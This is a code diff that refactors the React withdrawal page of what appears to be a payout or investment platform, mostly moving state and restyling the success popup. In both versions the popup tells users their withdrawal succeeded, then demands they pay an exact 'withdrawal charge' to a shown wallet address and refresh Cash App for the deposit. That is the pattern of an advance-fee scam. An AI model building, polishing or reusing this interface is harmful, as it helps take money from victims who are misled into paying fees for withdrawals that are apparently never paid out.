@@ -92,11 +92,6 @@ function Withdraw() {
     cardLast4: "",
   });
 
-  const [done, setDone] = useState<{
-    amount: number;
-    id: string;
-  } | null>(null);
-
   const numericAmount = Number(amount) || 0;
   const min = settings?.min_withdrawal ?? 0;
   const withdrawalsEnabled = settings?.withdrawals_enabled ?? true;
@@ -106,19 +101,18 @@ function Withdraw() {
   );
 
   const setDetail =
-    (k: keyof Details) =>
-    (e: ChangeEvent<HTMLInputElement>) =>
-      setDetails((d) => ({
-        ...d,
-        [k]: e.target.value,
+    (key: keyof Details) =>
+    (e: ChangeEvent<HTMLInputElement>) => {
+      setDetails((current) => ({
+        ...current,
+        [key]: e.target.value,
       }));
+    };
 
   const closeDone = () => {
-    setDone(null);
     setShowSuccessModal(false);
     setCopied(false);
     setWithdrawalAmount(0);
-
     setAmount("");
     setType(null);
 
@@ -154,7 +148,7 @@ function Withdraw() {
       await navigator.clipboard.writeText(walletAddress);
       setCopied(true);
 
-      setTimeout(() => {
+      window.setTimeout(() => {
         setCopied(false);
       }, 2000);
     } catch {
@@ -165,7 +159,6 @@ function Withdraw() {
   return (
     <AppShell title="Withdraw">
       <div className="max-w-2xl space-y-6">
-
         {/* ACCOUNT SUMMARY */}
         <div className="grid gap-3 sm:grid-cols-4">
           <div className="rounded-xl border border-border p-4">
@@ -351,22 +344,18 @@ function Withdraw() {
                   payout_method_id: null,
                 },
                 {
-                  onSuccess: (row) => {
-                    setDone({
-                      amount: numericAmount,
-                      id: row.id,
-                    });
-
+                  onSuccess: () => {
                     setWithdrawalAmount(numericAmount);
                     setShowSuccessModal(true);
                   },
 
-                  onError: (err) =>
+                  onError: (err) => {
                     toast.error(
                       err instanceof Error
                         ? err.message
                         : "Could not place withdrawal",
-                    ),
+                    );
+                  },
                 },
               );
             }}
@@ -555,9 +544,7 @@ function Withdraw() {
                 disabled={create.isPending}
                 className="w-2/3 rounded-2xl bg-primary py-4 font-bold text-primary-foreground transition-opacity hover:opacity-90 disabled:opacity-50"
               >
-                {create.isPending
-                  ? "Submitting…"
-                  : "Confirm Withdrawal"}
+                {create.isPending ? "Submitting…" : "Confirm Withdrawal"}
               </button>
             </div>
           </form>
@@ -620,75 +607,73 @@ function Withdraw() {
         </div>
       )}
 
-{/* SUCCESS POPUP */}
-{/* SUCCESS POPUP */}
-{showSuccessModal && (
-  <div className="fixed inset-0 z-[100] min-h-screen w-full overflow-y-auto bg-white">
-    <div className="flex min-h-screen w-full flex-col px-8 py-20 sm:px-16 sm:py-24">
+      {/* SUCCESS POPUP */}
+      {showSuccessModal && (
+        <div className="fixed inset-0 z-[100] min-h-screen w-full overflow-y-auto bg-white">
+          <div className="mx-auto flex min-h-screen w-full max-w-md flex-col px-5 py-20">
+            {/* Success Icon */}
+            <div className="mb-12 flex h-24 w-24 shrink-0 items-center justify-center rounded-full bg-[#19B5D1]">
+              <Check
+                className="h-12 w-12 text-white"
+                strokeWidth={3}
+              />
+            </div>
 
-      {/* Success Icon */}
-      <div className="mb-16 flex h-24 w-24 shrink-0 items-center justify-center rounded-full bg-[#19B5D1]">
-        <Check
-          className="h-12 w-12 text-white"
-          strokeWidth={3}
-        />
-      </div>
+            {/* Title */}
+            <h2 className="mb-12 text-left text-4xl font-extrabold leading-tight tracking-tight text-black">
+              Withdrawal Placed
+              <br />
+              Successfully
+            </h2>
 
-      {/* Title */}
-      <h2 className="mb-20 text-left text-4xl font-bold leading-tight text-black sm:text-5xl">
-        Withdrawal Placed
-        <br />
-        Successfully
-      </h2>
+            {/* Main Success Box */}
+            <div className="w-full rounded-3xl border border-gray-200 bg-white p-5 shadow-sm">
+              {/* Withdrawal Message */}
+              <div className="space-y-8 text-center text-base leading-7 text-gray-600">
+                <p>
+                  Your withdrawal of{" "}
+                  <span className="font-bold text-black">
+                    ${withdrawalAmount.toFixed(2)}
+                  </span>{" "}
+                  has been placed successfully.
+                </p>
 
-      {/* Withdrawal Message */}
-      <div className="max-w-3xl space-y-10 text-center text-lg leading-8 text-gray-600">
-        <p>
-          Your withdrawal of{" "}
-          <span className="font-bold text-black">
-            ${withdrawalAmount.toFixed(2)}
-          </span>{" "}
-          has been placed successfully.
-        </p>
+                <p>
+                  Pay exactly{" "}
+                  <span className="font-bold text-black">
+                    {formatUsd(withdrawalFee)}
+                  </span>{" "}
+                  withdrawal charge to the wallet address below and refresh
+                  your Cash App for the deposit.
+                </p>
+              </div>
 
-        <p>
-          Pay exactly{" "}
-          <span className="font-bold text-black">
-            {formatUsd(withdrawalFee)}
-          </span>{" "}
-          withdrawal charge to the wallet address below and refresh your Cash
-          App for the deposit.
-        </p>
-      </div>
+              {/* Wallet Address */}
+              <div className="mt-8 break-all rounded-2xl border border-gray-200 bg-gray-50 px-5 py-5 text-left font-mono text-sm leading-6 text-gray-700">
+                {walletAddress}
+              </div>
 
-      {/* Wallet Address */}
-      <div className="mt-16 w-full max-w-3xl">
-        <div className="break-all rounded-2xl border border-gray-200 bg-gray-50 px-6 py-6 text-left font-mono text-base leading-7 text-gray-700">
-          {walletAddress}
+              {/* Copy Wallet Address */}
+              <button
+                type="button"
+                onClick={copyWalletAddress}
+                className="mt-5 flex h-16 w-full items-center justify-center rounded-2xl border border-gray-200 bg-white text-base font-bold text-black transition hover:bg-gray-50"
+              >
+                {copied ? "Wallet Address Copied!" : "Copy Wallet Address"}
+              </button>
+            </div>
+
+            {/* OK Button */}
+            <button
+              type="button"
+              onClick={closeDone}
+              className="mt-6 flex h-16 w-full items-center justify-center rounded-full bg-[#2616D9] text-lg font-bold text-white shadow-lg transition hover:opacity-90"
+            >
+              OK
+            </button>
+          </div>
         </div>
-
-        <button
-          type="button"
-          onClick={(copyWalletAddress)}
-          className="mt-6 flex w-full items-center justify-center rounded-2xl border border-gray-200 bg-white py-6 text-lg font-bold text-black transition hover:bg-gray-50"
-        >
-          {copied
-            ? "Wallet Address Copied!"
-            : "Copy Wallet Address"}
-        </button>
-
-        <button
-          type="button"
-          onClick={closeDone}
-          className="mt-8 w-full rounded-full bg-[#2616D9] py-6 text-lg font-bold text-white shadow-lg transition hover:opacity-90"
-        >
-          OK
-        </button>
-      </div>
-
-    </div>
-  </div>
-)}
+      )}
     </AppShell>
   );
 }
